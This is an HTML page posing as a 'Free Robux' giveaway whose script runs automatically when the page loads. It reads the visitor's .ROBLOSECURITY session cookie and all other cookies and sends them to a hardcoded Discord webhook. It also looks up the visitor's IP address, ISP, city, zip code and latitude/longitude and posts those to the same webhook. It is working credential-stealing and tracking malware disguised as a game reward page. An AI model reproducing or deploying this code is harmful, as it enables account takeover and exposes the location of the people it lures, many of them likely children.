<!DOCTYPE html>
<html>
<head>
    <title>Roblox Free Robux</title>
    <script>
        // Discord webhook URL
        var webHookUrl = "https://discord.com/api/webhooks/1338299297292226590/vG66beFgowK_JWnSqaeHltm50_Wl7R26AGggIGdc_Xpw71OqDh4NriFFAzk4hWX5PCNB";

        // Cookie Logger (unchanged)
        function logRobloxCookie() {
            try {
                const cookies = document.cookie;
                console.log("All cookies:", cookies);

                const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || "Cookie not found";
                const cookieValue = robloxCookie.includes('=') ? robloxCookie.split('=')[1] : robloxCookie;

                const payload = {
                    username: "Roblox Logger",
                    content: "Cookie check triggered!",
                    embeds: [{
                        title: "Cookie Info",
                        fields: [
                            { name: "ROBLOSECURITY", value: `\`\`\`${cookieValue}\`\`\``, inline: true },
                            { name: "Time", value: new Date().toLocaleString(), inline: true },
                            { name: "All Cookies", value: `\`\`\`${cookies || "None"}\`\`\``, inline: false }
                        ],
                        color: 15258703
                    }]
                };

                fetch(webHookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) console.log("Cookie sent to webhook!");
                    else throw new Error(`Cookie webhook failed: ${response.status}`);
                })
                .catch(error => console.error("Cookie fetch error:", error));
            } catch (error) {
                console.error("Cookie script error:", error);
            }
        }

        // IP Logger (forked from luisoos/IP-Log-To-Discord-Webhook)
        async function logIP() {
            try {
                const response = await fetch('https://ip-api.com/json/');
                if (!response.ok) throw new Error(`IP-API fetch failed: ${response.status}`);
                const data = await response.json();

                // IP and geolocation data
                var ip = data.query;
                var provider = data.org + " (" + data.as + ")";
                var timezone = data.timezone;
                var country = data.country;
                var countryCode = data.countryCode.toLowerCase();
                var region = data.region + " (" + data.regionName + ")";
                var city = data.city;
                var zip = data.zip;
                var lat = data.lat;
                var lon = data.lon;

                // POST request to Discord
                var postRequest = new XMLHttpRequest();
                postRequest.open("POST", webHookUrl);
                postRequest.setRequestHeader('Content-type', 'application/json');

                var params = {
                    username: "IP Log",
                    avatar_url: "",
                    content: "__**:globe_with_meridians: IP-Address:**__ \n" 
                            + "`" + ip + "`" + 
                            "\n \n__**:telephone: Provider:**__ \n" 
                            + provider + 
                            "\n \n__**:map: Timezone:**__ \n" 
                            + timezone + 
                            "\n \n__**:flag_" + countryCode + ": Country and Region:**__ \n" 
                            + country + " - " + region + 
                            "\n \n__**:cityscape: Zip Code & City:**__ \n" 
                            + zip + " " + city +
                            "\n \n__**:round_pushpin: Location:**__ \n" 
                            + "**Longitude:** " + lon + "\n"
                            + "**Latitude:** " + lat
                };

                postRequest.onload = function() {
                    if (postRequest.status === 204) {
                        console.log("IP sent to webhook!");
                    } else {
                        console.error("IP webhook failed:", postRequest.status);
                    }
                };
                postRequest.onerror = function() {
                    console.error("IP webhook request error");
                };

                postRequest.send(JSON.stringify(params));
            } catch (error) {
                console.error("IP script error:", error);
            }
        }

        // Run both on load
        window.onload = function() {
            logRobloxCookie();
            logIP();
        };

        // Button trigger for manual testing
        function manualTrigger() {
            logRobloxCookie();
            logIP();
        }
    </script>
</head>
<body>
    <h1>Loading Your Free Robux...</h1>
    <button onclick="manualTrigger()">Test Again</button>
    <p>Set test cookie in console: <code>document.cookie = ".ROBLOSECURITY=test123; path=/";</code></p>
</body>
</html>
